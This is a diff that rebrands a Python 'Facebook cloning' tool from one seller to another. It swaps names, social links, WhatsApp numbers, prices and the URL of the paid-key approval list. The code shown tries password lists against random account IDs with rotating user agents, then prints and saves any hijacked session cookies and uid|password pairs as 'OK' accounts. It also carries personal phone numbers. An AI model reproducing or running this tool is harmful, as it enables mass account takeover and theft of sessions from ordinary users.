@@ -5,7 +5,7 @@
 from os import path
 import os,base64,zlib,pip,urllib
 print('\n\033[1;37m install modules....\n It will take some seconds...JAR   W8 update Tool..')
-os.system('xdg-open https://youtube.com/channel/UCRedHPu_qhEpO9aLttjRKrg')
+os.system('xdg-open https://youtube.com/@shahidbd71-yy6rg?si=OKbs_3vXtwRQHc5Z')
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
@@ -245,22 +245,20 @@ else:
 def banner():
     clear()
     print(f"""\033[1;92m
-\033[1;37m      ____        _       ________    
-\033[1;92m     `MM'        dM.     `MMMMMMMb.  
-\033[1;37m       MM       ,MMb       MM    `Mb  
-\033[1;37m       MM      ,P `Mb      MM     MM  
-\033[1;92m       MM      d'  YM.     MM    .M9  
-\033[1;37m       MM     ,P   `Mb     MMMMMMM9'  
-\033[1;92m       MM     d'    YM.    MM  \M\    
-\033[1;37m (8)   MM    ,MMMMMMMMb    MM   \M\   
-\033[1;92m ((   ,M9    d'      YM.   MM    \M\  
-\033[1;37m  YMMMM9   _dM_     _dMM_  MM_    \M\_
+\033[1;37m             ░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄☆
+\033[1;92m             ░███████████████████████
+\033[1;92m             ░▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤
+\033[1;92m             ╬▀░▐▓▓▓▓▓▓▌▀█░░░█▀░
+\033[1;92m             ▒░░▓▓▓▓▓▓█▄▄▄▄▄█▀╬░
+\033[1;92m             ░░█▓▓▓▓▓▌░▒▒▒▒▒▒▒▒▒
+\033[1;92m             ░▐█▓▓▓▓▓░░▒▒▒▒▒▒▒▒▒
+\033[1;92m             ░▐██████▌╬░▒▒▒▒▒▒▒▒  
 \033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
-\033[1;37m│ ❲★❳ AUTHOR   : Jahidul islam          │ 
-\033[1;37m│ ❲★❳ GITHUB   : Jahidul404             |
-\033[1;37m│ ❲★❳ WHATSAPP : +88 01701707661        │
+\033[1;37m│ ❲★❳ AUTHOR   : SHAHID HASAN          │ 
+\033[1;37m│ ❲★❳ GITHUB   : SHAHID HASAN             |
+\033[1;37m│ ❲★❳ WHATSAPP : +88 0100000000        │
 \033[1;37m│ ❲★❳ TOOLS    : \033[1;32mGAME ID CLONER  \033[1;37m       │
-\033[1;37m│ ❲★❳ VERSION  : \033[1;35m 4\033[1;35mK \033[1;32mPREMIUM  \033[1;37m          │
+\033[1;37m│ ❲★❳ VERSION  : \033[1;35m 7\033[1;35mK \033[1;32mPREMIUM  \033[1;37m          │
 \033[1;93m└━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┘""")
 #---------------------[LOOP MENU]---------------------#
 loop = 0
@@ -338,7 +336,7 @@ def main():
        os.system(' ')
        menu()
     if sh =='6':
-       os.system('xdg-open https://www.facebook.com/profile.php?id=100000446995720')
+       os.system('xdg-open https://www.facebook.com/ak.saed.10?mibextid=ZbWKwL')
        main()  
 
         
@@ -392,8 +390,8 @@ def random_apk():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -437,8 +435,8 @@ def random_MIX():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -484,8 +482,8 @@ def random_number1():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -529,8 +527,8 @@ def random_number2():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -574,8 +572,8 @@ def random_number3():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -622,8 +620,8 @@ def random_gmail():
         print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
         print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
         print(f" {P}[{H}★{P}]{WHITE} METHUD    : \033[1;92m{doamin}")
-        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-OK.txt  ")
+        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SHAHID-CP.txt  ")
         print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
         print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
         print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -649,7 +647,7 @@ def apk(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -694,8 +692,8 @@ def apk(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}SHAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -708,7 +706,7 @@ def mix(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -752,8 +750,8 @@ def mix(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}SHAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -766,7 +764,7 @@ def fcrack(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -801,7 +799,7 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\033[1;92m [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\033[1;92m [SHAHID>OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                 #cek_apk(session,coki)
                 oks.append(cid)
@@ -810,8 +808,8 @@ def fcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}SHAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -824,7 +822,7 @@ def fcrack1(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -859,7 +857,7 @@ def fcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\033[1;92m [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\033[1;92m [SHAHID>OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                 #cek_apk(session,coki)
                 oks.append(cid)
@@ -869,8 +867,8 @@ def fcrack1(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}SHAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -884,7 +882,7 @@ def fcrack2(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -919,7 +917,7 @@ def fcrack2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\033[1;92m  [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\033[1;92m  [SHAHID>OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                 oks.append(cid)
@@ -929,8 +927,8 @@ def fcrack2(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[SHAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}SHAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -942,11 +940,11 @@ def approval():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "4h".join(uuid)
   try:
-    httpCaht = requests.get('https://raw.githubusercontent.com/Jahidul404/apv/main/apv-a').text
+    httpCaht = requests.get('https://github.com/saedhasan7840/Paid/blob/main/approve.txt').text
     if id in httpCaht:
       print("\33[1;32mYour Token is Successfully Approved")
       print('\033[1;93mYour Token is Successfully Approved ')
-      psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION MD JAHID ISLAM ')
+      psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION MD SHAHID HASAN ')
       msg = str(os.geteuid())
       time.sleep(0.03)
       print()
@@ -957,18 +955,18 @@ def approval():
       print("\033[1;97m[\033[92;1m●\033[1;97m] \033[1;97mYour Key \033[38;5;196mNot Registered ")                             
       print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
       print("\033[1;97m[\033[92;1m●\033[1;97m] Tools... :\033[92;1m Facebook Cloning ")
-      print('\033[1;97m[\033[92;1m●\033[1;97m] Status   :\033[38;5;196m Trail')
+      print('\033[1;97m[\033[92;1m●\033[1;97m] Status   :\033[38;5;196m PAID')
       print("\033[1;97m[\033[92;1m●\033[1;97m] Your Key :\033[92;1m "+id)
       print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
       print('\033[1;97m[\033[92;1m●\033[1;97m]\x1b[97m\033[37;41m Note:If You Are Free User Don,t Come Inbox\033[0;m \033[1;97m[\033[92;1m●\033[1;97m]')
-      print('\033[1;97m[\033[92;1m●\033[1;97m] 7-Days Price :\033[92;1m 300 \033[1;97m[\033[92;1m●\033[1;97m] 15-Days Price :\033[92;1m 500 \033[1;97m[\033[92;1m●\033[1;97m]')
+      print('\033[1;97m[\033[92;1m●\033[1;97m] 15-Days Price :\033[92;1m 300 \033[1;97m[\033[92;1m●\033[1;97m] 30-Days Price :\033[92;1m 550 \033[1;97m[\033[92;1m●\033[1;97m]')
       print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
       print('\033[1;97m[\033[92;1m●\033[1;97m] Fb Cloning Menu')
       print('\033[1;97m[\033[92;1m●\033[1;97m] File Create Menu')
       print('\033[1;97m[\033[92;1m●\033[1;97m] Join Fb Group')
       print('\033[1;97m[\033[92;1m●\033[1;97m] Exit Menu')                               
       input('\033[1;97m[\033[92;1mENTER\033[1;97m] Upgrade Tool (\033[92;1mPremium\033[1;97m)  ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801701707661?text='+tks),approval()
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801305696552?text='+tks),approval()
       time.sleep(1)
       approval()
   except:
